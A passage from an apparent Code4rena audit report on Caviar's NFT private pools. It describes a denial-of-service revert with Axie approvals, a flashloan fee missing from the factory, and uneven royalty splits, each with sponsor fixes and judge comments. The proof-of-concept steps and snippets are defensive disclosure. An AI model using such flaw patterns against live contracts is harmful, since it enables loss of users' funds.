}</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following steps can occur for the described scenario.</p>\n<ol>\n<li>Alice calls the <code>EthRouter.sell</code> function to sell 1 Axie NFT to a private pool, which succeeds.</li>\n<li>Alice calls the <code>EthRouter.sell</code> function again to sell another Axie NFT to the same private pool. However, this function call’s execution of <code>ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true)</code> reverts because Axie’s <code>require(_tokenOperator[msg.sender][_operator] != _approved)</code> reverts.</li>\n<li>Bob tries to repeat Step 2 but his <code>EthRouter.sell</code> function call also reverts.</li>\n<li>Hence, the <code>EthRouter.sell</code> function is DOS’ed for selling any Axie NFTs to the same private pool for any users.</li>\n</ol>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>EthRouter.sell</code>, <code>EthRouter.deposit</code>, and <code>EthRouter.change</code> functions can be respectively updated to check if the <code>EthRouter</code> contract has approved the corresponding pool to spend any of the corresponding ERC721 tokens received by itself. If not, the corresponding ERC721’s <code>setApprovalForAll</code> function can be called; otherwise, the corresponding ERC721’s <code>setApprovalForAll</code> function should not be called.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/776#issuecomment-1519912118\">outdoteth (Caviar) confirmed and mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/7\">https://github.com/outdoteth/caviar-private-pools/pull/7</a></p>\n<p>Proposed fix is to skip the approval step if the pool has already been approved to transfer the NFTs from the EthRouter.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_approveNfts</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// check if the router is already approved to transfer NFTs from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">isApprovedForAll</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">target</span><span class=\"mtk1\">)) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// approve the target to transfer NFTs from the router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/776#issuecomment-1527209794\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, the always re-approve pattern can cause reverts, this is contingent on the specific NFT used, however, AXIE is in my opinion a sufficiently relevant token for this finding to be valid.</p>\n<p>Due to it’s reliance on token implementation I agree with Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-flashloan-fee-is-not-distributed-to-the-factory\" style=\"position:relative;\"><a href=\"#m-06-flashloan-fee-is-not-distributed-to-the-factory\" aria-label=\"m 06 flashloan fee is not distributed to the factory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/697\">[M-06] Flashloan fee is not distributed to the factory</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/697\">rvierdiiev</a></em></p>\n<p>When user takes a flashloan, then <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L651\">he pays a fee</a> to the PrivatePool.\nThe problem is that the whole fee amount is sent to PrivatePool and factory receives nothing.</p>\n<p>However, all other function of contract send some part of fees to the factory.</p>\n<p>For example, <code>change</code> function, which is similar to the <code>flashloan</code> as it doesn’t change virtual nft and balance reserves. This function <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L736-L737\">calculates pool and protocol fees</a>.</p>\n<p>But in case of flashloan, only pool receives fees.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Send some part of flashloan fee to the factory.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1519957289\">outdoteth (Caviar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/8\">https://github.com/outdoteth/caviar-private-pools/pull/8</a>.</p>\n<p>Proposed fix is to add a method that returns the protocol fee and flash fee. And then have the flash fee function sum the two outputs:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashFeeAndProtocolFee</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolFeeRate</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">flashFeeAndProtocolFee</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>and then add the protocol payment in the flashLoan method:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// -- snip -- //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer the fee from the borrower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">flashFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer the protocol fee to the factory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">protocolFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer the protocol fee to the factory</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">protocolFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1528972275\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@outdoteth - Can you please confirm if you originally intended to have the protocol charge a fee for Flashloans?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1530128568\">outdoteth (Caviar) commented</a>:</strong></p>\n<blockquote>\n<p>It was an oversight that we did not charge fees on flash loans. It’s implied that it should be paid though since protocol fees are charged everywhere else a user makes a transaction.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/697#issuecomment-1531011905\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has found an inconsistency as to how fees are paid. After confirming with the Sponsor, I agree with Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-royalty-recipients-will-not-get-fair-share-of-royalties\" style=\"position:relative;\"><a href=\"#m-07-royalty-recipients-will-not-get-fair-share-of-royalties\" aria-label=\"m 07 royalty recipients will not get fair share of royalties permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/669\">[M-07] Royalty recipients will not get fair share of royalties</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/669\">0xLanterns</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/996\">abiih</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/992\">bshramin</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/985\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/866\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/815\">Bason</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/627\">DishWasher</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/580\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/525\">Voyvoda</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/516\">savi0ur</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/479\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/440\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/374\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/303\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/297\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/272\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/255\">ElKu</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/188\">Dug</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/175\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/110\">yixxas</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/68\">J4de</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/30\">Ruhum</a></em></p>\n<p>Recipients of NFTs who accept royalties will not get their fair share of royalties. This is because royalties are calculated by dividing the sales price equally amongst all sold NFTs in that purchase. The issue with this is that it assumes all NFTs cost the same amount when it comes time to deal out royalties. If NFTs cost different amounts, then they should be getting an amount of royalties based on that weight relative to the other NFTs. The impact of this is that Royalties will not be distributed evenly at the expense of the more expensive NFT. Meaning that recipients of the expensive NFT will always receive less than they are owed. And the cheaper ones will get more than owed. In short, this is a loss of funds or misdistribution of funds.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The easiest way to test this will to be add this snippet into Milady.sol.</p>\n<p>Using this to have access to ERC2981’s <code>setRoyaltyInfo()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">file: </span><span class=\"mtk12\">Milady</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRoyaltyInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_royaltyFeeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_royaltyRecipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">royaltyFeeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_royaltyFeeRate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_royaltyRecipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">supportsInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interfaceId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC2981</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">supportsInterface</span><span class=\"mtk1\">(</span><span class=\"mtk12\">interfaceId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">royaltyInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salePrice</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">royaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRoyaltyInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reciever</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 